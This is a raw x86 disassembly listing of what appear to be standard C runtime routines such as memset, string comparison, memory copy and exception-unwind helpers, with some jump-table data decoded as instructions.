  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
